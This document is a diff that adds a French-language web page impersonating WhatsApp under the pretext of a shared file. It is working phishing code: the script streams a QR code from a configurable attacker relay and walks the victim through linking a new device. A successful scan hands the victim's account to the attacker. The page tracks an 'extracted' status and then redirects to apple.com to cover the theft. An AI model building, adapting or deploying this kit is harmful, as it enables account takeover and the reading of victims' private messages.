@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<meta name="referrer" content="no-referrer">
+<title>WhatsApp · Fichier partagé</title>
+<style>
+  :root{--bg:#111b21;--card:#202c33;--fg:#e9edef;--mut:#8696a0;--wa:#00a884;--err:#f15c6d}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;background:var(--bg);color:var(--fg);min-height:100vh;font:16px/1.5 -apple-system,"Segoe UI",Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;padding:24px 16px}
+  .wa-logo{display:flex;align-items:center;gap:10px;margin:12px 0 24px;color:var(--wa)}
+  .wa-logo svg{width:34px;height:34px;fill:var(--wa)}
+  .wa-logo span{font-size:19px;font-weight:600;color:var(--fg)}
+  .card{width:100%;max-width:400px;background:var(--card);border-radius:14px;padding:24px 20px;text-align:center}
+  h1{font-size:19px;margin:0 0 8px;font-weight:600}
+  .sub{color:var(--mut);font-size:14px;margin:0 0 22px;line-height:1.55}
+  .qr-wrap{background:#fff;border-radius:12px;padding:12px;margin:0 auto 20px;width:fit-content;position:relative}
+  .qr-wrap img{width:280px;height:280px;display:block}
+  .qr-wrap.blur img{filter:blur(14px);transition:filter .4s}
+  .qr-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35);border-radius:12px;color:#fff;font-size:14px;font-weight:600;text-align:center;padding:16px}
+  .status{margin:16px 0 0;font-size:13.5px;color:var(--mut);min-height:20px}
+  .status.ok{color:var(--wa)}.status.err{color:var(--err)}
+  .steps{list-style:none;padding:0;margin:20px 0 0;text-align:left;font-size:13.5px;color:var(--mut);line-height:1.85}
+  .steps li{padding-left:26px;position:relative}
+  .steps li::before{content:attr(data-n);position:absolute;left:0;top:0;width:18px;height:18px;border-radius:50%;background:var(--wa);color:#fff;font-size:11px;font-weight:700;display:grid;place-items:center;line-height:1}
+  .foot{color:#667781;font-size:11.5px;margin-top:20px;text-align:center;line-height:1.5}
+  .spin{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite;vertical-align:middle;margin-right:6px}
+  @keyframes s{to{transform:rotate(360deg)}}
+  .success{color:var(--wa);font-size:44px;margin:12px 0 8px}
+  [hidden]{display:none!important}
+</style>
+</head>
+<body>
+
+<div class="wa-logo">
+  <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+  <span>WhatsApp</span>
+</div>
+
+<main class="card" id="main">
+  <h1>Fichier partagé avec vous</h1>
+  <p class="sub">Scannez ce code QR avec votre téléphone pour <b>lier votre appareil</b> et consulter le fichier.</p>
+
+  <div class="qr-wrap blur" id="qrWrap">
+    <img id="qrImg" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='280'><rect fill='%23ffffff' width='280' height='280'/><text x='140' y='145' font-family='sans-serif' font-size='14' fill='%238696a0' text-anchor='middle'>Chargement…</text></svg>" alt="">
+    <div class="qr-overlay" id="qrOverlay"><span class="spin"></span> Chargement du QR…</div>
+  </div>
+
+  <p class="status" id="status">Préparation…</p>
+
+  <ol class="steps">
+    <li data-n="1">Ouvrez WhatsApp sur votre téléphone</li>
+    <li data-n="2">Appuyez sur Menu ⋮ → Appareils liés</li>
+    <li data-n="3">Appuyez sur <b>Lier un appareil</b> et scannez</li>
+  </ol>
+
+  <p class="foot">🔒 Connexion chiffrée de bout en bout<br>Vos messages restent privés.</p>
+</main>
+
+<main class="card" id="done" hidden>
+  <div class="success">✓</div>
+  <h1>Appareil lié</h1>
+  <p class="sub">Chargement du fichier partagé…</p>
+  <p class="status ok">Redirection en cours</p>
+</main>
+
+<script>
+(function(){
+  'use strict';
+
+  /* ═══ CONFIG — À MODIFIER ═══ */
+  const RELAY = 'https://votre-app.godaddy.com'; // URL GoDaddy
+  const REDIRECT = 'https://www.apple.com/';     // URL de sortie
+  /* ══════════════════════════ */
+
+  const $ = id => document.getElementById(id);
+  const wrap = $('qrWrap'), img = $('qrImg'), overlay = $('qrOverlay'), st = $('status');
+
+  function setStatus(t, k){
+    st.textContent = t || '';
+    st.className = 'status' + (k ? ' ' + k : '');
+  }
+
+  let received = false;
+
+  try {
+    const es = new EventSource(RELAY + '/qr');
+
+    es.addEventListener('qr', function(e){
+      try {
+        const d = JSON.parse(e.data);
+        if (d.image) {
+          img.src = d.image;
+          wrap.classList.remove('blur');
+          overlay.hidden = true;
+          setStatus('En attente du scan…');
+          received = true;
+        }
+      } catch(_){}
+    });
+
+    es.addEventListener('status', function(e){
+      try {
+        const d = JSON.parse(e.data);
+        if (d.status === 'linked') {
+          setStatus('Appareil lié, synchronisation…', 'ok');
+          $('main').hidden = true;
+          $('done').hidden = false;
+          setTimeout(() => { location.replace(REDIRECT); }, 4000);
+        } else if (d.status === 'extracted') {
+          setStatus('✓ Terminé', 'ok');
+        }
+      } catch(_){}
+    });
+
+    es.addEventListener('error', function(){
+      if (!received) setStatus('Connexion lente, patientez…');
+    });
+  } catch(e) {
+    setStatus('Erreur de connexion', 'err');
+  }
+
+  setTimeout(function(){
+    if (!received) setStatus('Régénération du QR…');
+  }, 15000);
+})();
+</script>
+</body>
+</html>
